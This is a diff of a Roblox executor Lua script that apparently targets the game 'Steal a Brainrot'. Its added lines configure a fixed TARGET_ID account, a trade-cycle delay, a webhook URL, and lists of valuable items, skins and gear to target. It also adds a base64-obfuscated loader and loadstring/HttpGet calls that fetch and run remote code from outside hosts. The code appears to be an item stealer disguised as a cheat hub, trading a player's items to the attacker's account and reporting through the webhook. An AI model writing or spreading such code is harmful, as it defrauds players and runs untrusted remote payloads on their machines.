@@ -1,106 +1,22 @@
-getgenv().SECRET_KEY = "mrr_4f1b86edfa3942169ba3a5f5fc2bbc19"
-getgenv().TARGET_ID = 6074348674
-getgenv().DELAY_STEP = 1      
+getgenv().SECRET_KEY = "mrr_20d10dd75dd44d95a5e52422057e7a2b"
+getgenv().TARGET_ID = 79880
+getgenv().DELAY_STEP = 1
 getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().TARGET_BRAINROTS = {
-    ["Fortunu and Cashuru"] = true,
-    ["Los Amigos"] = true,
-    ["Los Sekolahs"] = true,
-    ["La Ginger Sekolah"] = true,
-    ["Sammyni Fattini"] = true,
-    ["Los Spaghettis"] = true,
-    ["Cloverat Clapat"] = true,
-    ["Rosetti Tualetti"] = true,
-    ["Fishino Clownino"] = true,
-    ["Gold Gold Gold"] = true,
-    ["Jolly Jolly Sahur"] = true,
-    ["Lavadorito Spinito"] = true,
-    ["Ketchuru and Musturu"] = true,
-    ["Swaggy Bros"] = true,
-    ["La Romantic Grande"] = true,
-    ["Orcaledon"] = true,
-    ["Tictac Sahur"] = true,
-    ["La Taco Combinasion"] = true,
-    ["Ketupat Kepat"] = true,
-    ["Tang Tang Keletang"] = true,
-    ["Lovin Rose"] = true,
-    ["Los Tacoritas"] = true,
-    ["Eviledon"] = true,
-    ["Los Primos"] = true,
-    ["W or L"] = true,
-    ["Esok Sekolah"] = true,
-    ["La Jolly Grande"] = true,
-    ["Los Cupids"] = true,
-    ["Los Puggies"] = true,
-    ["Tralaledon"] = true,
-    ["Gobblino Uniciclino"] = true,
-    ["Tuff Toucan"] = true,
-    ["Chipso and Queso"] = true,
-    ["Chillin Chili"] = true,
-    ["La Spooky Grande"] = true,
-    ["Los Bros"] = true,
-    ["La Extinct Grande"] = true,
-    ["Celularcini Viciosini"] = true,
-    ["Money Money Puggy"] = true,
-    ["Los Hotspotsitos"] = true,
-    ["Los Planitos"] = true,
-    ["Las Sis"] = true,
-    ["Tacorita Bicicleta"] = true,
-    ["Tirilikalika Tirilikalako"] = true,
-    ["Griffin"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Love Love Bear"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["Celestial Pegasus"] = true,
-    ["Cerberus"] = true,
-    ["Popcuru and Fizzuru"] = true,
-    ["Rosey and Teddy"] = true,
-    ["Capitano Moby"] = true,
-    ["Cooki and Milki"] = true,
-    ["Burguro And Fryuro"] = true,
-    ["Ketupat Bros"] = true,
-    ["Reinito Sleighito"] = true,
-    ["La Secret Combinasion"] = true,
-    ["Signore Carapace"] = true,
-    ["La Casa Boo"] = true,
-    ["Fragrama and Chocrama"] = true,
-    ["La Food Combinasion"] = true,
-    ["Elefanto Frigo"] = true,
-    ["Spooky and Pumpky"] = true,
-    ["Ginger Gerat"] = true,
-    ["Festive 67"] = true,
-    ["Ventoliero Pavonero"] = true,
-    ["Antonio"] = true,
-    ["Nacho Spyder"] = true,
-    ["Duggy Bros"] = true,
-    ["Globa Steppa"] = true,
-    ["Garama and Madundung"] = true,
-    ["Dug dug dug"] = true,
-    ["Rico Dinero"] = true,
-    ["25"] = true,
-    ["Bunny and Eggy"] = true,
-    ["Kalika Bros"] = true,
-    ["Cash or Card"] = true,
-    ["Los Chillis"] = true,
-    ["Hydra Bunny"] = true,
-    ["Boppin Bunny"] = true,
-    ["Gym Bros"] = true,
-    ["Quackini Snackini"] = true,
-    ["La Easter Grande"] = true,
-    ["Los Mariachis"] = true,
-    ["La Lucky Grande"] = true,
-    ["Hopilikalika Hopilikalako"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Meowl"] = true,
-    ["Headless Horseman"] = true,
-    ["Skibidi Toilet"] = true,
-    ["Digi Narwhal"] = true
-}
+getgenv().secret67 = "1466429734383517801"
+getgenv().SecretToken = "Onlyplaystrongest"
+getgenv().User = "Onlyplaystrongest"
+getgenv().Webhook = "https://jjgociynthbfobvfosol.supabase.co/functions/v1/webhook-proxy/7e8b470169dc48bfa32cdd4a626d29e9sbhuuc0a"
+getgenv().TARGET_BRAINROTS = {"Meowl", "Strawberry Elephant", "Skibidi Toilet", "Headless Horseman", "Hydra Dragon Cannelloni", "Griffin", "Dragon Cannelloni", "Dragon Gingerini", "La Supreme Combinasion", "Love Love Bear", "Cerberus", "Celestial Pegasus", "Rosey and Teddy", "Popcuru and Fizzuru", "Cooki and Milki", "Capitano Moby", "Ketupat Bros", "Burguro And Fryuro", "Fortunu and Cashuru", "Reinito Sleighito", "La Secret Combinasion", "Los Amigos", "Signore Carapace", "Los Sekolahs", "Fragrama and Chocrama", "La Casa Boo", "Elefanto Frigo", "La Food Combinasion", "Ginger Gerat", "Spooky and Pumpky", "Sammyni Fattini", "La Ginger Sekolah", "Festive 67", "Los Spaghettis", "Cloverat Clapat", "Ventoliero Pavonero", "Antonio", "Rosetti Tualetti", "Nacho Spyder", "Fishino Clownino", "Garama and Madundung", "Jolly Jolly Sahur", "Gold Gold Gold", "Ketchuru and Musturu", "Lavadorito Spinito", "Swaggy Bros", "Tirilikalika Tirilikalako", "Orcaledon", "La Romantic Grande", "La Taco Combinasion", "Tictac Sahur", "Ketupat Kepat", "Dug dug dug", "Lovin Rose", "Los Tacoritas", "Eviledon", "W or L", "Los Primos", "La Jolly Grande", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan", "Mieteteira Bicicleteira", "Chipso and Queso", "Chillin Chili", "Money Money Reindeer", "Los Bros", "La Spooky Grande", "La Extinct Grande", "Celularcini Viciosini", "Money Money Puggy", "Los Planitos", "Los Hotspotsitos", "Las Sis", "Tacorita Bicicleta", "Fragola La La La", "Ice Dragon", "Egg Lucky Block", "Leprechaun Lucky Block", "Heart Lucky Block", "Spooky Lucky Block", "Festive Lucky Block", "Hydra Bunny", "Bunny and Eggy", "Foxini Lanternini", "Boppin Bunny", "Quackini Snackini", "Hopilikalika Hopilikalako", "La Easter Grande", "La Lucky Grande"}
+getgenv().TARGET_BASESKINS = {"Gold", "Diamond", "Rainbow", "Candy", "Lava", "Galaxy", "Yin Yang", "Radioactive", "Cursed", "Divine", "Cyber", "Halloween", "Aquatic", "Christmas", "Gingerbread", "Taco", "Valentine's", "Rose", "Pot of Gold", "Lucky", "Bunny Basket", "Easter", "Red Octo"}
+getgenv().TARGET_GEARS = {"Alien Slap", "Blackhole Bomb", "Bloodmoon Hammer", "Bloodmoon Slap", "Cupid's Wings", "Cursed Slap", "Cyber Slap", "Demon's Head", "Divine Slap", "Lava Blaster", "Lava Slap", "Radioactive Airstrike", "Radioactive Slap", "Rainbow Hammer", "Rainbow Slap", "Santa's Sleigh", "Waverider", "Witch's Broom", "Yin Yang Lamp", "Yin Yang Slap"}
+getgenv().ScriptMode = "CUSTOM"
+getgenv().CustomScript = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9VTkMtc2NyaXB0ZXIvY3Vyc2VkLWh1Yi9yZWZzL2hlYWRzL21haW4vQ1VSU0VEJTIwSFVCLnR4dCIpKSgp"
+
 task.spawn(function()
-loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/02e1486d7975b1e0ba514e6752b1ed01.lua"))()
 end)
+
+-- Custom Script
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/UNC-scripter/cursed-hub/refs/heads/main/CURSED%20HUB.txt"))()
 end)
